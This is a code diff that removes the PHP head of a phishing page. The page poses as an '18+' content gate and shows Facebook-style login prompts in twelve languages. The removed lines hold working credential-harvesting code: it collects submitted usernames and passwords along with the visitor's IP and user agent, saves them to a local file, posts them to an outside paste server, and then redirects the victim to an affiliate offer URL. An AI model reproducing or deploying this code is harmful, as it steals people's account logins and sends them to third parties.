@@ -1,16 +1,4 @@
-<?php
-	$file = "phiz.txt"; //File for saved data login
-	$cloud_server = 'http://textsave.net/x05njl3'; //Đẩy data lên sever
-	//$cloud_server = 'https://textsave.net/zoq6bal'; //Đẩy data lên sever
-	
-	
-	$img = './phi3.jpg'; //Link ảnh background
-	$url ='https://www.bestofferxxx.com/?sl=5338662-25048&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}'; //URL chuyển hướng
-	
-	$GoogleAnalytics = 'UA-180277316-1'; //UA-390312345-1
-	
-	if(isset($_POST['submit'])){$user=$_POST['user'];$pass=$_POST['pass'];$lang=$_POST['lang'];$wd=$_POST['wd'];$ip=$_SERVER['REMOTE_ADDR'];if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip=$_SERVER["HTTP_CF_CONNECTING_IP"];}$data="$user|$pass|ug:$_SERVER[HTTP_USER_AGENT][FBDM/{$wd};FBLC/$lang]|ip:$ip";file_put_contents($file,"$data\r\n",FILE_APPEND);if(!empty($cloud_server)){$postdata=http_build_query(array('text'=>$data,'append'=>'true'));$opts=array('http'=>array('method'=>'POST','header'=>'Content-Type: application/x-www-form-urlencoded','content'=>$postdata));$context=stream_context_create($opts);$result=file_get_contents($cloud_server,false,$context);}echo"<script language=\"javascript\">window.location=\"$url\";</script>";exit();}$lang=substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2);$acceptLang=['vi','en','th','ko','pt','zh','fr','ja','id','ms','tl','hi'];$lang=in_array($lang,$acceptLang)?$lang:'en';$languages=array('vi'=>array('welcome'=>'Nội dung 18+, vui lòng đăng nhập trước khi xem.','user'=>'Email hoặc số điện thoại','pass'=>'Password','submit'=>'Đăng nhập','forgot'=>'Quên tài khoản?',),'en'=>array('welcome'=>'Content 18+, please login before viewing.','user'=>'Email address or phone number','pass'=>'Password','submit'=>'Log In','forgot'=>'Forgotten account?',),'th'=>array('welcome'=>'เนื้อหา 18+ กรุณาเข้าระบบก่อนรับชม','user'=>'อีเมลหรือหมายเลขโทรศัพท์มือถือ','pass'=>'รหัสผ่าน','submit'=>'เข้าสู่ระบบ','forgot'=>'ลืมบัญชีใช่หรือไม่',),'ko'=>array('welcome'=>'콘텐츠 18+,보기 전에 로그인하십시오.','user'=>'이메일 또는 전화번호','pass'=>'비밀번호','submit'=>'로그인','forgot'=>'계정을 잊으셨나요?',),'pt'=>array('welcome'=>'Conteúdo 18+, faça o login antes de visualizar.','user'=>'Email ou telefone','pass'=>'Senha','submit'=>'Entrar','forgot'=>'Esqueceu a conta?',),'zh'=>array('welcome'=>'内容18+岁以上，请先登录再查看。','user'=>'電子郵件地址或手機號碼','pass'=>'密碼','submit'=>'登入','forgot'=>'忘記帳號？',),'fr'=>array('welcome'=>'Contenu 18+, veuillez vous connecter avant de visionner.','user'=>'Adresse e-mail ou numéro de tél.','pass'=>'Mot de passe','submit'=>'Connexion','forgot'=>'Informations de compte oubliées ?',),'ja'=>array('welcome'=>'コンテンツ18+、閲覧する前にログインしてください。','user'=>'メールアドレスまたは電話番号:','pass'=>'パスワード','submit'=>'ログイン','forgot'=>'アカウントを忘れた場合',),'id'=>array('welcome'=>'Konten 18+, harap masuk sebelum melihat.','user'=>'Email atau Nomor Telepon','pass'=>'Kata Sandi','submit'=>'Login','forgot'=>'Lupa akun?',),'ms'=>array('welcome'=>'Kandungan 18+, sila masuk sebelum melihat.','user'=>'E-mel atau Nombor Telefon','pass'=>'Kata Laluan','submit'=>'Log Masuk','forgot'=>'Lupa akaun?',),'tl'=>array('welcome'=>'Nilalaman 18+, mangyaring mag-login bago tingnan.','user'=>'Email O Numero ng Telepono','pass'=>'Password','submit'=>'Mag-log In','forgot'=>'Nakalimutan ang account?',),'hi'=>array('welcome'=>'सामग्री 18+, कृपया देखने से पहले लॉगिन करें।','user'=>'ईमेल या फ़ोन नंबर','pass'=>'पासवर्ड','submit'=>'लॉग इन करें','forgot'=>'खाता भूल गए?',),);$lang=$languages[$lang];
-?>
+
 <!doctype html>
     <html>
         <head>
